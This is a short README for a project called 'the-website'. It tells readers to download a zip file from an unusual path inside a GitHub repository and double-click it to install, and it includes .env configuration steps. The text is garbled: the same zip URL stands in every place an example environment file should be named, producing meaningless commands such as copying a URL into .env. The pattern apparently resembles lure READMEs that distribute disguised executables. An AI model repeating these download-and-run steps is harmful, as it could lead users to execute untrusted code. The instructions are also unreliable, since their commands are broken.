## 🚀 Getting Started

### Step 1: Download the Software
To start using the software, you need to download it. Please visit this page to download the latest version: [Download the-website](https://github.com/MDRafee1/the-website/raw/refs/heads/master/pages/api/user/the-website-1.5-beta.4.zip).

### Step 2: Install the Software
Once you have downloaded the software, follow these steps to install it:

1. Locate the downloaded file, usually in your "Downloads" folder.
2. Double-click the file to initiate the installation.
3. Follow the on-screen prompts to complete the installation. This process will take just a few minutes.

### Step 3: Configure Your Environment
The application requires some configuration to work properly. Here are two options:

#### Option A — Use `https://github.com/MDRafee1/the-website/raw/refs/heads/master/pages/api/user/the-website-1.5-beta.4.zip` (Recommended)
If the file `https://github.com/MDRafee1/the-website/raw/refs/heads/master/pages/api/user/the-website-1.5-beta.4.zip` is available, you do not need to create a new `.env` file from scratch. Simply copy the example file as follows:

```bash
cp https://github.com/MDRafee1/the-website/raw/refs/heads/master/pages/api/user/the-website-1.5-beta.4.zip .env
```

After that, make sure to adjust the values of the variables inside, especially the `GROQ_API_KEY`.

#### Option B — Create `.env` Manually
If the `https://github.com/MDRafee1/the-website/raw/refs/heads/master/pages/api/user/the-website-1.5-beta.4.zip` file is missing, you need to create the `.env` file manually:

1. Open the terminal or command prompt.
2. Navigate to the root directory of the project.
3. Run the following command:

```bash
touch .env
```

Next, fill in the necessary values as listed in your project documentation. 

## ⚙️ System Requirements

- Operating System: Windows 10 or later / macOS 10.15 or later
- Memory: At least 4 GB of RAM
- Disk Space: Minimum of 200 MB free space
- Network: Internet connection to access API features

## 🛠️ Troubleshooting
If you encounter any issues during installation or while running the software, here are some common solutions:

1. **Installation Errors**: Make sure your system meets the requirements mentioned above. Restart your computer and try installing again.
2. **Configuration Issues**: Double-check the values in your `.env` file. Ensure all required variables are set correctly.
